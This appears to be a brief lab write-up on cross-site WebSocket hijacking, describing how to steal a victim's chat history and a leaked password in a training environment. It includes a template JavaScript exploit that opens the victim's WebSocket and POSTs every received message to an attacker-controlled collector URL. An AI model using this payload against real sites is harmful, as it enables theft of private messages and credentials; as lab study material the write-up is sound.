**Objective**
Exfiltrate the victim's chat history

**Point of Entry**
Live chat associated WebSocket requests.

**Execution**
- Open Live chat and send a few messages. Then reload page.
- Notice under WebSocket history that reloading page issues a READY message to server to retrieve recent chat history.
- Go to HTTP history to find the WebSocket handshake request.
- Host the template JavaScript exploit on Exploit server. Exfiltrating the chat history will require a collaborator payload.
- Deliver exploit to victim and view their HTTP and DNS requests by polling in Collaborator. 
- The HTTP requests contain sent messages, which include Carlos's password. Login using password to solve the lab.

**Template Exploit**
`<script> var ws = new WebSocket('wss://your-websocket-url'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`